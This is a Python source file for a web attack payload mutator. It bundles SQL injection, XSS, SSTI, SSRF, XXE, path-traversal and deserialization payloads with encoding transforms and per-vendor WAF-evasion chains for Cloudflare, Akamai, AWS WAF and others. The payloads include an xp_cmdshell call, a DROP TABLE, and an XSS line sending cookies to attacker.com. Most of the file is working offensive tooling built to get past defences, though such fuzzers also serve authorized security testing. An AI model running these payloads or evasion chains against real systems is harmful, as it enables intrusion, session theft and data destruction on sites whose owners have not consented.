from __future__ import annotations

import itertools
import random
import re
import urllib.parse
from typing import Callable, Iterator

CORPUS: dict[str, list[str]] = {
    "sqli": [
        "' OR '1'='1",
        "' OR 1=1--",
        '" OR "1"="1',
        "1' AND SLEEP(5)--",
        "1; SELECT SLEEP(5)--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT username,password FROM users--",
        "1 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        "'; EXEC xp_cmdshell('whoami')--",
        "' AND 1=1--",
        "' AND 1=2--",
        "';WAITFOR DELAY '0:0:5'--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))xyz)--",
        "1; DROP TABLE users--",
    ],
    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "'\"><script>alert(1)</script>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "javascript:alert(1)",
        "<iframe src=javascript:alert(1)>",
        '"><img src=x onerror="alert(1)">',
        "';alert(String.fromCharCode(88,83,83))//",
        "<script>fetch('https://attacker.com?c='+document.cookie)</script>",
    ],
    "ssti": [
        "{{7*7}}",
        "${7*7}",
        "{{config}}",
        "{{self.__class__.__mro__[1].__subclasses__()}}",
        "{%for x in [1]%}{{x.__class__.__bases__}}{%endfor%}",
        "#{7*7}",
        "*{7*7}",
        "<%= 7*7 %>",
    ],
    "ssrf": [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:22/",
        "http://localhost:6379/",
        "http://[::1]/",
        "file:///etc/passwd",
        "dict://127.0.0.1:6379/info",
        "gopher://127.0.0.1:6379/_INFO%0D%0A",
        "http://0.0.0.0/",
    ],
    "xxe": [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://attacker.com/x">]><root>&test;</root>',
    ],
    "idor": [
        "1",
        "0",
        "-1",
        "999999",
        "2",
        "../",
        "../../etc/passwd",
        "%2e%2e%2f",
    ],
    "deserial": [
        'O:8:"stdClass":0:{}',
        "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==",
    ],
}


def _url_encode(s: str) -> str:
    return urllib.parse.quote(s, safe="")


def _double_url_encode(s: str) -> str:
    return urllib.parse.quote(urllib.parse.quote(s, safe=""), safe="")


def _html_entity(s: str) -> str:
    return (
        s.replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace("&", "&amp;")
        .replace('"', "&quot;")
    )


def _unicode_escape(s: str) -> str:
    return "".join(f"\\u{ord(c):04x}" if ord(c) > 0x7A else c for c in s)


def _null_byte(s: str) -> str:
    return s + "%00"


def _case_shuffle(s: str) -> str:
    result = []
    toggle = True
    for c in s:
        if c.isalpha():
            result.append(c.upper() if toggle else c.lower())
            toggle = not toggle
        else:
            result.append(c)
    return "".join(result)


def _comment_inject(s: str) -> str:
    # Insert SQL-style inline comment between key tokens
    return re.sub(r"\s+", "/**/", s)


def _hex_encode(s: str) -> str:
    return "".join(f"%{ord(c):02x}" for c in s)


def _tab_newline(s: str) -> str:
    return s.replace(" ", "\t").replace("\n", "%0a")


# All available transforms, in order of increasing aggressiveness
_TRANSFORMS: list[tuple[str, Callable[[str], str]]] = [
    ("url_encode", _url_encode),
    ("double_url_encode", _double_url_encode),
    ("html_entity", _html_entity),
    ("unicode_escape", _unicode_escape),
    ("null_byte", _null_byte),
    ("case_shuffle", _case_shuffle),
    ("comment_inject", _comment_inject),
    ("hex_encode", _hex_encode),
    ("tab_newline", _tab_newline),
]

# WAF -> recommended transform chain
_WAF_CHAINS: dict[str, list[str]] = {
    "Cloudflare": ["url_encode", "case_shuffle", "unicode_escape", "comment_inject"],
    "Akamai": ["double_url_encode", "unicode_escape", "null_byte", "tab_newline"],
    "AWS WAF": ["url_encode", "double_url_encode", "hex_encode", "comment_inject"],
    "Imperva / Incapsula": ["html_entity", "case_shuffle", "null_byte", "url_encode"],
    "Sucuri": ["url_encode", "case_shuffle", "comment_inject"],
    "ModSecurity": ["url_encode", "double_url_encode", "comment_inject", "tab_newline"],
    "Barracuda": ["unicode_escape", "hex_encode", "null_byte"],
    "F5 BIG-IP ASM": ["url_encode", "case_shuffle", "tab_newline"],
    "Wordfence": ["html_entity", "url_encode", "comment_inject"],
}

_ALL_TRANSFORM_NAMES = [name for name, _ in _TRANSFORMS]
_TRANSFORM_MAP = dict(_TRANSFORMS)


# Context-aware payload priorities for smart fuzzing
# Parameters matching these patterns get priority payloads
_CONTEXT_PRIORITY_PAYLOADS: dict[str, list[str]] = {
    # URL/redirect parameters → SSRF and Open Redirect first
    "url": ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1/", "//evil.com"],
    "redirect": ["http://evil.com", "//evil.com", "/\\x5cevil.com"],
    "next": ["http://evil.com", "//evil.com"],
    "path": ["../../../etc/passwd", "....//....//etc/passwd"],
    "file": ["file:///etc/passwd", "file:///c:/windows/win.ini"],
    # ID/numeric parameters → SQLi first (fast payloads, not time-based)
    "id": ["' OR '1'='1", "' OR 1=1--", "1 AND 1=1"],
    "user": ["' OR '1'='1", "admin'--", "1 OR 1=1"],
    "num": ["-1", "999999", "0"],
}


def _get_priority_payloads(param_name: str, category: str) -> list[str]:
    """Get context-aware priority payloads for a parameter.
    Returns appropriate payloads based on parameter name patterns.
    """
    param_lower = param_name.lower()
    priority = []

    # Check for URL/redirect/SSRF-related parameters
    if any(kw in param_lower for kw in ["url", "redirect", "next", "return", "callback", "target"]):
        priority.extend(_CONTEXT_PRIORITY_PAYLOADS.get("url", []))
        priority.extend(_CONTEXT_PRIORITY_PAYLOADS.get("redirect", []))

    # Check for path/file-related parameters
    if any(kw in param_lower for kw in ["path", "file", "dir", "folder", "location"]):
        priority.extend(_CONTEXT_PRIORITY_PAYLOADS.get("path", []))
        priority.extend(_CONTEXT_PRIORITY_PAYLOADS.get("file", []))

    # Check for ID/numeric parameters
    if any(kw in param_lower for kw in ["id", "user", "num", "count", "page", "offset", "limit"]):
        priority.extend(_CONTEXT_PRIORITY_PAYLOADS.get("id", []))
        priority.extend(_CONTEXT_PRIORITY_PAYLOADS.get("user", []))
        priority.extend(_CONTEXT_PRIORITY_PAYLOADS.get("num", []))

    # Category-specific fast payloads (avoid heavy time-based until confirmed)
    if category == "sqli":
        # Fast error-based payloads first (no delays)
        fast_sqli = [
            "'",
            "\"",
            "' OR '1'='1",
            "' AND 1=1--",
            "' AND 1=2--",
            "1' ORDER BY 10--",
            "1' UNION SELECT NULL--",
        ]
        # Time-based SLEEP payloads go LAST (after fast ones confirm potential sqli)
        time_based_sqli = [
            "1' AND SLEEP(5)--",
            "1; SELECT SLEEP(5)--",
            "';WAITFOR DELAY '0:0:5'--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))xyz)--",
        ]
        priority = fast_sqli + [p for p in priority if p not in fast_sqli and p not in time_based_sqli]
        priority.extend([p for p in time_based_sqli if p in priority])

    return priority


class Mutator:
    def mutations(
        self,
        payload: str,
        waf: str | None = None,
        max_transforms: int = 3,
    ) -> Iterator[str]:

        yield payload

        # Choose transform order
        if waf and waf in _WAF_CHAINS:
            priority = _WAF_CHAINS[waf]
            others = [n for n in _ALL_TRANSFORM_NAMES if n not in priority]
            transform_order = priority + others
        else:
            transform_order = _ALL_TRANSFORM_NAMES

        # Single transforms
        for name in transform_order:
            fn = _TRANSFORM_MAP[name]
            result = fn(payload)
            if result != payload:
                yield result

        # Chained transform combinations (up to max_transforms deep)
        for length in range(2, min(max_transforms, len(transform_order)) + 1):
            for combo in itertools.combinations(transform_order[:6], length):
                result = payload
                for name in combo:
                    result = _TRANSFORM_MAP[name](result)
                if result != payload:
                    yield result

    def context_aware_payloads(
        self,
        param_name: str,
        category: str,
        waf: str | None = None,
    ) -> Iterator[dict]:
        """Generate context-aware payloads for a specific parameter.
        Prioritizes payloads based on parameter name patterns (e.g., 'url' param gets SSRF first).
        Yields fast, low-hanging fruit payloads before heavy time-based ones.
        """
        # Get priority payloads for this parameter context
        priority = _get_priority_payloads(param_name, category)

        # Yield priority payloads first (with minimal transforms)
        seen = set()
        for payload in priority:
            if payload not in seen:
                seen.add(payload)
                yield {
                    "payload": payload,
                    "category": category,
                    "transform_chain": [],
                    "priority": "high",
                }

        # Then yield the standard corpus (with transforms)
        for mutated in self.corpus_mutations(category, waf=waf, max_transforms=1):
            if mutated["payload"] not in seen:
                seen.add(mutated["payload"])
                yield {
                    **mutated,
                    "priority": "normal",
                }

    def corpus_mutations(
        self,
        category: str,
        waf: str | None = None,
        max_transforms: int = 2,
    ) -> Iterator[dict]:

        payloads = CORPUS.get(category, [])
        for seed in payloads:
            chain: list[str] = []
            for mutated in self.mutations(seed, waf=waf, max_transforms=max_transforms):
                yield {
                    "payload": mutated,
                    "category": category,
                    "transform_chain": chain[:],
                }

    def all_mutations(
        self,
        waf: str | None = None,
        categories: list[str] | None = None,
    ) -> Iterator[dict]:
        # Iterate over all corpus categories and yield mutations.

        cats = categories or list(CORPUS.keys())
        for cat in cats:
            yield from self.corpus_mutations(cat, waf=waf)
